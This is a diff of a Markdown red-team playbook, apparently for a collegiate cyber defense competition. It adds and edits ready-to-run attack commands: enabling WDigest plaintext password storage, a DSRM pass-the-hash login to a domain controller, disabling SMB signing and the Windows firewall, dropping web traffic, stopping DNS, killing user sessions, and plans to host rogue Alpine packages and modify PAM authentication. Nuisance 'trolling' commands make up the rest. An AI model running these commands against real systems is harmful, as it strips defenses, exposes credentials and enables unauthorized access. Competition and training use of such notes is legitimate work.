@@ -89,7 +89,8 @@ pagetitle: Red Teaming for CCDC
     - Makes it so you have to solve a times-table equation to see the result of your command
   - Get something going for alpine/Nixos
     - Alpine
-      - Add a second location for SSH keys 
+      - Host APKs to download
+      - Need /x86_64/APKINDEX.tar.gz hosted
     - Nixos
       - Get gcc with `nix-shell -p libgcc pam`
       - Figure out which PAM file controls auth and modify it
@@ -164,6 +165,7 @@ pagetitle: Red Teaming for CCDC
 - Store plaintext password with WDigest: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -Type DWord`
 - Allow DSRM account logon at all times: `Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2`
   - This makes the DC accept the local SAM hash for the Administrator user, just specify user as `{DC_name}/User`
+    - `authfinder {IP} -u '{DC_NAME}\Administrator' -H {og_hash} `
 
 **Make Services Worse**
 - Disable SMB Signing: `Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force`
@@ -261,13 +263,15 @@ pagetitle: Red Teaming for CCDC
   - `wall "dance"`
 - Set language to german: `echo "loadkeys de && localectl set-locale de_DE.UTF-8 && localectl set-keymap de" >> ~/.bashrc`
 - Firewall
-  - Iptables: `iptables -A INPUT -p tcp --dport 80 -j drop` 
+  - Iptables: `iptables -A INPUT -m multiport -p tcp --dport 80,443 -j DROP` 
   - NFT: `nft add rule inet filter input tcp dport 80 drop`
   - UFW: `ufw deny 80/tcp`
 - `who` to see who's on a system
   - `pkill -t {result}` to then kill their session
     - `pkill -KILL -u {user}` - kill all of a user's processes
   - `kill -9 {pid}` to kill a specific process
+- DNS:
+  - Alpine: `rc-service dnsmasq stop && rc-update del dnsmasq default`
   
 **Trolling on Windows**
 - Set everything to German: `Install-Language -Language de-DE -CopyToSettings; Set-WinUserLanguageList de-DE -Force; Set-WinSystemLocale -SystemLocale de-DE; Set-WinUILanguageOverride -Language de-DE; Set-Culture de-DE; Set-WinHomeLocation -GeoId 94`
@@ -286,7 +290,7 @@ pagetitle: Red Teaming for CCDC
 - Spawn 50 notepads:
   - `1..50 | ForEach-Object {Start-Process notepad}`
 - Spawn message box on Windows:
-  - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
+  - `Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show("hi :)", "see below", 0, 64)`
 - Firewall stuff
   - Simplewall hopper: `https://github.com/ECWRCCDC/swh/blob/main/Payload/source/swh.c`
   - Turn off firewall: `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`
